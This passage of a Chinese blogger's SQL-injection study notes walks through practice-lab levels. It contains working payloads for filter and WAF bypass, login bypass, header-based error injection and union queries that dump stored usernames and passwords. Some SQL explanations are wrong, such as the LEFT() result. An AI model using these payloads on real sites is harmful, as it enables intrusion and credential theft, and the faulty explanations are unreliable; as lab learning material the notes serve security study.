id=\"2-and-or-过滤绕过\"><a href=\"#2-and-or-过滤绕过\" class=\"headerlink\" title=\"2 and or 过滤绕过\"></a>2 and or 过滤绕过</h1><ol>\n<li><p>大小写绕过</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 anD 1=1 order by n<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>复写过滤字符</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 aandnd 1=1 order by n<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>用&amp;&amp;代替and 用||代替or</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 &amp;&amp; 1=1 order by n <br></code></pre></td></tr></table></figure>\n</li>\n<li><p>url编码</p>\n<p>例如将&amp;&amp;编码为%26</p>\n</li>\n</ol>\n<p>当然还有很多</p>\n\n\n<h2 id=\"2-1-实战less25\"><a href=\"#2-1-实战less25\" class=\"headerlink\" title=\"2.1 实战less25\"></a>2.1 实战less25</h2><p>这里直接实战一下吧好久没有不看课打靶了</p>\n<p>首先判断字段数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; order by 3--+<br></code></pre></td></tr></table></figure>\n\n<p>发现order被过滤成了der，</p>\n<p>说明or关键字被过滤</p>\n<p>这里复写过滤字符绕过了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; oorrder by 3--+<br></code></pre></td></tr></table></figure>\n\n<p>判断出字段数是3</p>\n<p>接下来构造语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,3--+<br></code></pre></td></tr></table></figure>\n\n<p>发现回显位是2,3</p>\n<p>开始注入，这里知道了表名和列名直接最后一步吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,group_concat(id,username,passwoorrd) from users--+<br></code></pre></td></tr></table></figure>\n\n<p>因为or被过滤了所以password要写成passwoorrd</p>\n<p>结束</p>\n<h1 id=\"3-空格过滤绕过\"><a href=\"#3-空格过滤绕过\" class=\"headerlink\" title=\"3 空格过滤绕过\"></a>3 空格过滤绕过</h1><ol>\n<li><p>url编码绕过</p>\n<p>这里的url编码可以使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">%20, %09, %0a, %0b, %0c, %0d, %a0<br></code></pre></td></tr></table></figure>\n\n<p>less26发现没有一个是可以用的</p>\n</li>\n<li><p>不出现空格</p>\n<p>使用||可以有效避免这个问题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27;||extractvalue(1,concat(0x7e,(你的语句)))||&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>使用+代替空格</p>\n</li>\n</ol>\n<h1 id=\"4-limit过滤绕过\"><a href=\"#4-limit过滤绕过\" class=\"headerlink\" title=\"4 limit过滤绕过\"></a>4 limit过滤绕过</h1><p>limit用不了可以使用substring()函数，</p>\n<p>如果substring()函数也被过滤了，</p>\n<p>可以使用mid()函数替换，与substring函数用法完全相同，</p>\n<p>语句完全兼容，</p>\n<p>在如果连这两个函数都被过滤了，可以使用left函数，</p>\n<p>他的用法几乎和这两个函数一样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select left(&#x27;vincent&#x27;,2);<br>+-------------------+<br>| left(&#x27;vincent&#x27;,2) |<br>+-------------------+<br>| vi                |<br>+-------------------+<br></code></pre></td></tr></table></figure>\n\n<p>MySQL中的LEFT()函数是一个字符串函数，它返回字符串左边的指定字符数。该函数接受两个参数，第一个参数为指定字符串，第二个参数为要返回的字符数。</p>\n<p>语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">LEFT(string, length)<br></code></pre></td></tr></table></figure>\n\n<p>其中，</p>\n<ul>\n<li>string：必需，要截取左侧部分的字符串；</li>\n<li>length：必需，要返回的长度，是一个非负整数。</li>\n</ul>\n<p>示例：</p>\n<p>假设有一个表t1，其中有一个字段name，值为“ChinaGPT”。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT LEFT(name, 4) AS shortened_name FROM t1;<br></code></pre></td></tr></table></figure>\n\n<p>查询结果将会是“Chat”。</p>\n<p>注意：如果给出的length大于string的长度，则返回整个字符串。如果给出的length为0或负数，则返回空字符串。</p>\n<h1 id=\"5-逗号绕过\"><a href=\"#5-逗号绕过\" class=\"headerlink\" title=\"5 逗号绕过\"></a>5 逗号绕过</h1><ol>\n<li><p>老一套的url编码大概率不行</p>\n</li>\n<li><p>join绕过</p>\n<p>问了一下chatgpt：</p>\n<p>在SQL中，JOIN是用于将两个或多个表格基于它们之间的关联字段进行连接的操作。JOIN操作允许从多个表格中检索相关数据，并将其组合成一个结果集。以下是几种常见的JOIN类型及其用法：</p>\n<ol>\n<li><p>内连接（INNER JOIN）： 内连接返回两个表中满足连接条件的行。语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 列名<br>FROM 表1<br>INNER JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT Orders.OrderID, Customers.CustomerName<br>FROM Orders<br>INNER JOIN Customers<br>ON Orders.CustomerID = Customers.CustomerID;<br></code></pre></td></tr></table></figure>\n\n<p>这个查询将返回满足关联条件的Orders表和Customers表中的行，包含OrderID和CustomerName列。</p>\n</li>\n<li><p>左连接（LEFT JOIN）： 左连接返回左表中的所有行，以及右表中满足连接条件的行。如果右表中没有匹配的行，则会返回NULL值。语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 列名<br>FROM 表1<br>LEFT JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>LEFT JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>\n\n<p>这个查询将返回Customers表中的所有行以及满足关联条件的Orders表中的行。如果没有匹配的订单，OrderID列将包含NULL值。</p>\n</li>\n<li><p>右连接（RIGHT JOIN）： 右连接返回右表中的所有行，以及左表中满足连接条件的行。如果左表中没有匹配的行，则会返回NULL值。语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 列名<br>FROM 表1<br>RIGHT JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>RIGHT JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>\n\n<p>这个查询将返回Orders表中的所有行以及满足关联条件的Customers表中的行。如果没有匹配的顾客，CustomerName列将包含NULL值。</p>\n</li>\n<li><p>全连接（FULL JOIN）： 全连接返回左表和右表中的所有行，如果没有匹配的行，则会返回NULL值。语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 列名<br>FROM 表1<br>FULL JOIN 表2<br>ON 表1.关联字段 = 表2.关联字段;<br></code></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT Customers.CustomerName, Orders.OrderID<br>FROM Customers<br>FULL JOIN Orders<br>ON Customers.CustomerID = Orders.CustomerID;<br></code></pre></td></tr></table></figure>\n\n<p>这个查询将返回Customers表和Orders表中的所有行，如果没有匹配的行，对应的列将包含NULL值。</p>\n</li>\n</ol>\n<p>这些是最常见的JOIN类型，可以根据数据之间的关系选择合适的JOIN操作来获取所需的结果。需要注意的是，在使用JOIN时，关联字段的值应该相互匹配，以确保正确的连接。</p>\n</li>\n</ol>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,3 --+<br></code></pre></td></tr></table></figure>\n\n<p>等价于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select 3)c --+<br></code></pre></td></tr></table></figure>\n\n<p>可以在回显位开始你的表演</p>\n<h1 id=\"6-最后\"><a href=\"#6-最后\" class=\"headerlink\" title=\"6 最后\"></a>6 最后</h1><p>找到一份比较好的绕过总结</p>\n<p><a href=\"https://blog.csdn.net/Likhaooo/article/details/122746954\">SQL注入绕过技术总结</a></p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#13","url":"/2023/06/09/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-13/","content":"<p>这篇文章学习union 、select、宽字节过滤绕过</p>\n<p>以及一些打靶实战</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-union、select过滤绕过\"><a href=\"#1-union、select过滤绕过\" class=\"headerlink\" title=\"1 union、select过滤绕过\"></a>1 union、select过滤绕过</h1><ol>\n<li>大小写绕过，union -&gt; UniON，select - &gt; SELecT</li>\n<li>复写过滤词，union - &gt; ununionion</li>\n</ol>\n<h2 id=\"1-1-Less27实战\"><a href=\"#1-1-Less27实战\" class=\"headerlink\" title=\"1.1 Less27实战\"></a>1.1 Less27实战</h2><p>构造如下语句就可以绕过过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=0&#x27;%0AunIon%0ASelecT%0A1,2,3%0Aand%0A&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>\n\n<p>后面的就是老一套了</p>\n<p>这一关无法使用复写绕过</p>\n<h1 id=\"2-宽字节注入绕过\"><a href=\"#2-宽字节注入绕过\" class=\"headerlink\" title=\"2 宽字节注入绕过\"></a>2 宽字节注入绕过</h1>\n\n<h2 id=\"2-1-Less32实战\"><a href=\"#2-1-Less32实战\" class=\"headerlink\" title=\"2.1 Less32实战\"></a>2.1 Less32实战</h2><p>其实就是在单引号前面加个%df就好了</p>\n<p>构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1%df&#x27; order by 3--+    判断字段数<br><br>?id=-1%df&#x27; union select 1,2,3--+ 注出回显位<br><br>?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+获取表名<br><br>?id=-1%df&#x27; union select 1,2,group_concat(id,username,password) from users --+   结束<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-打靶实战\"><a href=\"#3-打靶实战\" class=\"headerlink\" title=\"3 打靶实战\"></a>3 打靶实战</h1><p>之前都是一遍看课一遍打靶的，</p>\n<p>up极大的制约了我的思路，</p>\n<p>所以接下来我觉得我有必要自己打几个靶场，</p>\n<p>我随便挑了几个：12，16，18，15，3，25</p>\n<h2 id=\"3-1-Less12-实战\"><a href=\"#3-1-Less12-实战\" class=\"headerlink\" title=\"3.1 Less12 实战\"></a>3.1 Less12 实战</h2><p>这是一个post注入，打开burp suite，</p>\n<p>构造万能密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>不行，登录还是失败</p>\n<p>猜测是闭合的问题，换成双引号，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&quot; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>这里就出现了报错，说明有戏，加个括号试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>这里成功登录了，现在开始爆库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&quot;) order by 2#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>判断字段数为2</p>\n<p>后面的直接查询表中内容吧，懒得搞前面的了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=-admin&quot;) union select 1,group_concat(id,username,password) from users#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-2-Less16-实战\"><a href=\"#3-2-Less16-实战\" class=\"headerlink\" title=\"3.2 Less16 实战\"></a>3.2 Less16 实战</h2><p>同样是post注入，</p>\n<p>构造万能语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>登陆失败，修改闭合方式</p>\n<p>单引号双引号都不报错，</p>\n<p>这里就没办法判断闭合了，就几个括号加上单引号双引号蒙吧，</p>\n<p>fuzz一下发现是双引号加括号successfully login</p>\n<p>难道是布尔盲注？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=-admin&quot;) or 1=2#&amp;passwd=admin&amp;submit=Submit  不正常<br><br>uname=-admin&quot;) or 1=1#&amp;passwd=admin&amp;submit=Submit 正常<br></code></pre></td></tr></table></figure>\n\n<p>具备布尔盲注条件！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=-admin&quot;) or length(database())=8#&amp;passwd=admin&amp;submit=Submit 正常<br><br>uname=-admin&quot;) or length(database())=7#&amp;passwd=admin&amp;submit=Submit 不正常<br></code></pre></td></tr></table></figure>\n\n<p>后面的就是写脚本爆破了，略</p>\n<h2 id=\"3-3-Less18-实战\"><a href=\"#3-3-Less18-实战\" class=\"headerlink\" title=\"3.3 Less18 实战\"></a>3.3 Less18 实战</h2><p>万能密码失败，但是他这是个弱口令🤣用户名密码都是admin。。。。我测试了一下正常的直接succeed了</p>\n<p>登陆后的页面是告诉我是ua注入</p>\n<p>判断闭合为单引号+括号</p>\n<p>开始构造语句，这里蒙参数是3个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">1&#x27;,2,extractvalue(1,concat(0x7e,(database()))))#   <br></code></pre></td></tr></table></figure>\n\n<p>成功获得回显，下一个，</p>\n<p>注：这里的构造payload最好的应该是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or extractvalue(1,concat(0x7e,(database())))) or &#x27;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-4-Less15-实战\"><a href=\"#3-4-Less15-实战\" class=\"headerlink\" title=\"3.4 Less15 实战\"></a>3.4 Less15 实战</h2><p>判断为布尔盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=-admin&#x27; or 1=1#&amp;passwd=admin&amp;submit=Submit  正常<br><br>uname=-admin&#x27; or 1=2#&amp;passwd=admin&amp;submit=Submit  不正常<br></code></pre></td></tr></table></figure>\n\n<p>和前面实操的Less16一样，只是修改了闭合方式而已，略</p>\n<h2 id=\"3-5-Less3-实战\"><a href=\"#3-5-Less3-实战\" class=\"headerlink\" title=\"3.5 Less3 实战\"></a>3.5 Less3 实战</h2><p>闭合为单引号括号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27;) --+<br></code></pre></td></tr></table></figure>\n\n<p>后面老一套</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27;) order by 3--+<br>.......<br>?id=-1&#x27;) union select 1,2,group_concat(id,username,password) from users--+<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-6-Less25-实战\"><a href=\"#3-6-Less25-实战\" class=\"headerlink\" title=\"3.6 Less25 实战\"></a>3.6 Less25 实战</h2><p>他嚣张的提示我的or和and被过滤了🤣</p>\n\n\n<ol>\n<li><p>大小写绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; oRder by 3--+<br></code></pre></td></tr></table></figure>\n\n<p>被过滤了</p>\n</li>\n<li><p>复写字符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; oorrder by 3--+<br></code></pre></td></tr></table></figure>\n\n<p>没被过滤</p>\n<p>判断出字段数为3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">.........<br>?id=-1&#x27; union select 1,2,group_concat(id,username,passwoorrd) from users--+<br></code></pre></td></tr></table></figure>\n\n<p>结束，就这？</p>\n<p>加一个靶场，less29！</p>\n</li>\n</ol>\n<h2 id=\"3-7-Less29-实战\"><a href=\"#3-7-Less29-实战\" class=\"headerlink\" title=\"3.7 Less29 实战\"></a>3.7 Less29 实战</h2><p>他再次嚣张的告诉我这一关被全世界最好的防火墙保护着🤣🤣🤣</p>\n\n\n<p>判断闭合，就是一个单引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from users --+<br></code></pre></td></tr></table></figure>\n\n<p>?????直接就成功了？？</p>\n<p>防火墙防了个啥？？</p>\n<p>看了一下他的提示，发现他把空格引号这种字符都编码了，</p>\n<p>但是编码了有什么用吗？？</p>\n<p>不行，再加一个Less35吧</p>\n<h2 id=\"3-8-Less35-实战\"><a href=\"#3-8-Less35-实战\" class=\"headerlink\" title=\"3.8 Less35 实战\"></a>3.8 Less35 实战</h2><p>首先判断闭合，</p>\n<p>单引号双引号都报错了，</p>\n<p>难道是数字型注入没有闭合？</p>\n<p>还真是。。。。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,2,group_concat(id,username,password) from users<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#14","url":"/2023/06/09/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-14/","content":"<p>这篇文章学习waf绕过的各种姿势</p>\n<span id=\"more\"></span>\n\n<p>up这里给靶场套上了waf，，</p>\n<p>但是我不会套，</p>\n<p>所以这篇笔记就是纯记录没有实操</p>\n<h1 id=\"1-使用运算判断字符型or数字型\"><a href=\"#1-使用运算判断字符型or数字型\" class=\"headerlink\" title=\"1 使用运算判断字符型or数字型\"></a>1 使用运算判断字符型or数字型</h1><p>平常使用and 1&#x3D;1 and 1&#x3D;2 判断数字型还是字符型，</p>\n<p>但是这里被安全狗检测了，</p>\n<p>and替换为&amp;&amp;没有用，</p>\n<p>添加&#x2F;**&#x2F;注释没用，</p>\n<p>我们可以理解一下概念，</p>\n<p>例如现在的查询语句时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from users where id=&#x27;$id&#x27; 字符型<br>select * from users where id=$id  数字型<br></code></pre></td></tr></table></figure>\n\n<p>他们两个根本的区别就是一个有闭合，</p>\n<p>也就是说，如果是数字型注入，他会执行id后面的运算，</p>\n<p>如果id&#x3D;2-1正常 id&#x3D;2-3不正常，那么就是数字型了，</p>\n<p>但是这种方式可能会被过滤，那么我们可以用更加冷门的运算比如异或，</p>\n<p>因此可以通过异或这种方式来判断是字符型还是数字型</p>\n<h1 id=\"2-order-by替换\"><a href=\"#2-order-by替换\" class=\"headerlink\" title=\"2 order by替换\"></a>2 order by替换</h1><p>替换成group by同样可以起到判断字段数的作用</p>\n<h1 id=\"3-添加无用字符绕过检测\"><a href=\"#3-添加无用字符绕过检测\" class=\"headerlink\" title=\"3 添加无用字符绕过检测\"></a>3 添加无用字符绕过检测</h1><ol>\n<li><p>添加垃圾字符</p>\n<p>其实原理就是利用&#x2F;**&#x2F;</p>\n<p>可以构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union /*!90000test*/ select 1,2,3 --+<br></code></pre></td></tr></table></figure>\n\n<p>即可绕过安全狗</p>\n</li>\n<li><p>注释后换行</p>\n<p>例如 –+ b %0A select</p>\n<p>%0A的意思就是换行，换行后注释就失效了</p>\n</li>\n</ol>\n<h1 id=\"4-替换绕过\"><a href=\"#4-替换绕过\" class=\"headerlink\" title=\"4 替换绕过\"></a>4 替换绕过</h1><h2 id=\"4-1-替换information-schema-tables\"><a href=\"#4-1-替换information-schema-tables\" class=\"headerlink\" title=\"4.1 替换information_schema.tables\"></a>4.1 替换information_schema.tables</h2><p>information_schema这个字符被过滤了可以尝试使用其他表，</p>\n<p>例如，</p>\n<p><code>sys.schema_table_statistics_with_buffer</code></p>\n<p><code>sys.x$ps_schema_table_statistics_io</code></p>\n<h2 id=\"4-2-替换information-schema-columns\"><a href=\"#4-2-替换information-schema-columns\" class=\"headerlink\" title=\"4.2 替换information_schema.columns\"></a>4.2 替换information_schema.columns</h2><p>这个需要使用到前面的join语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union --+ b %0Aselect * from (select * from users as a join users as b)c --+<br><br>?id=-1&#x27; union --+ b %0Aselect * from (select * from users as a join users as b using(id))c --+<br></code></pre></td></tr></table></figure>\n\n<p>后面可以一步步推出全部列名</p>\n<h1 id=\"5-超大数据包绕过\"><a href=\"#5-超大数据包绕过\" class=\"headerlink\" title=\"5 超大数据包绕过\"></a>5 超大数据包绕过</h1><p>有些时候数据包很大可能可以bypass安全狗</p>\n<p>因此我们只需要增大数据包即可，</p>\n<p>这个实战中写个python脚本就可以了，很简单</p>\n<h1 id=\"6-分块传输绕过安全狗\"><a href=\"#6-分块传输绕过安全狗\" class=\"headerlink\" title=\"6 分块传输绕过安全狗\"></a>6 分块传输绕过安全狗</h1><p>这个就是在burpsuite里面操作了</p>\n<p>例如我们要将id&#x3D;1分块，我们需要先写上字符占位数，</p>\n<p>然后换行写上字符，例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Transfer-Encoding: Chunked<br><br>1  # 一个字符<br>i<br>2  # 两个字符<br>d=<br>1  # 一个字符<br>1<br>0  # 零个字符，注意最后需要加上两个换行<br><br><br></code></pre></td></tr></table></figure>\n\n<p>这样就可以绕过waf了,</p>\n<p>这里up介绍了一个插件，</p>\n<p>但是好像似乎GitHub作者删了这个仓库搜不到这个插件了</p>\n<h1 id=\"7-笔记\"><a href=\"#7-笔记\" class=\"headerlink\" title=\"7 笔记\"></a>7 笔记</h1>\n\n<p>and</p>\n\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#15","url":"/2023/06/10/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-15/","content":"<p>这篇文章学习xff注入、NAME_CONST报错注入、</p>\n<p>Join实战中的运用，以及堆叠注入</p>\n<span id=\"more\"></span>\n\n<h1 id=\"XFF-Basic\"><a href=\"#XFF-Basic\" class=\"headerlink\" title=\"XFF-Basic\"></a>XFF-Basic</h1><p>首先知道xff注入是什么吧</p>\n<blockquote>\n<p>XFF，是X-Forwarded-for的缩写，XFF注入是SQL注入的一种，该注入原理是通过修改X-Forwarded-for头对带入系统的dns进行sql注入，从而得到网站的数据库内容。</p>\n</blockquote>\n<p>事实上，他也是http头的一部分，</p>\n<p>和前面的referer，cookie，user-agent差不多，</p>\n<p>同样可以使用常规的语句进行sql注入</p>\n<h1 id=\"XFF-实战注入\"><a href=\"#XFF-实战注入\" class=\"headerlink\" title=\"XFF-实战注入\"></a>XFF-实战注入</h1><p>靶场：</p>\n<p><a href=\"https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe\">https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe</a></p>\n<p>是一个登陆界面，post注入，尝试万能密码，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">admin&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>\n\n<p>失败，尝试更改闭合，失败，</p>\n<p>尝试referer注入，失败，</p>\n<p>但是注入时出现了这样一个弹窗，</p>\n\n\n<p>出现ip字段，确定是xff，但是倔强的我，，，</p>\n<p>偏要试试ua注入行不行——不行</p>\n<p>然后开始xff注入，</p>\n<p>首先判断闭合：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">X-Forwarded-For: 127.0.0.1&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>单引号报错，双引号不报错，后面确认闭合是单引号，</p>\n<p>开始构造语句，</p>\n<p>首先直接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">127.0.0.1&#x27; order by n#<br></code></pre></td></tr></table></figure>\n\n<p>没有正确回显，常规的union select不可以了，</p>\n<p>尝试报错注入，这里使用extractvalue</p>\n\n\n<p>到这里就成功了，后面就是老一套流程了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) # ---&gt; logins,user<br><br>-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;)))) #  ---&gt; id,username,password<br><br>-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from user)))) # ---&gt; 1admin1526328305<br></code></pre></td></tr></table></figure>\n\n\n\n<p>拿下~</p>\n<h1 id=\"NAME-CONST-Basic\"><a href=\"#NAME-CONST-Basic\" class=\"headerlink\" title=\"NAME_CONST - Basic\"></a>NAME_CONST - Basic</h1><p>MySQL中的name_const()函数是用于创建一个带有指定名称和值的常量。它的语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">name_const(name, value)<br></code></pre></td></tr></table></figure>\n\n<p>其中，name是常量的名称，value是常量的值。</p>\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT name_const(&#x27;PI&#x27;, 3.141592653589793) AS pi_value;<br></code></pre></td></tr></table></figure>\n\n<p>该查询将创建一个名为“PI”的常量，并将其值设置为3.141592653589793，然后将该常量作为pi_value返回。</p>\n<p>常量在MySQL中是只读变量，一旦创建，就不能被修改或删除。name_const()函数使得可以创建常量来在查询中引用任意值，这些值可以再次引用而无需重复输入。该函数功能比较简单，但是在某些场景下非常有用。</p>\n<hr>\n<p>但是，这个函数有一个弊端，</p>\n<p>在mysql版本5.0之后就不适用了</p>\n<hr>\n<p>首先我们看一下基本的语句</p>\n<p>采用join连接查询构造查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from (select * from(select name_const((你的语句),0)) a join (select name_const((你的语句),0))b)c;<br></code></pre></td></tr></table></figure>\n\n<p>注意两个“你的语句”应该相同</p>\n<p>参考：</p>\n<blockquote>\n<p><a href=\"https://www.bilibili.com/video/BV1YE411c7HH\">https://www.bilibili.com/video/BV1YE411c7HH</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_46706771/article/details/112768863\"> MYSQL 通过NAME_CONST()报错注入</a></p>\n</blockquote>\n<p>这里介绍一下exist函数：</p>\n<p>MySQL函数<code>EXISTS</code> 接受一个子查询作为参数，并返回一个布尔值。如果子查询返回任何行，则<code> EXISTS</code> 返回 <code>TRUE</code>, 否则返回 <code>FALSE</code>。</p>\n<p>下面是<code>EXISTS</code> 函数的一些示例:</p>\n<ol>\n<li>检查表中是否存在某个匹配行</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT * FROM products WHERE EXISTS(SELECT * FROM categories WHERE products.category_id = categories.id);<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li>使用 EXISTS 实现条件逻辑</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code 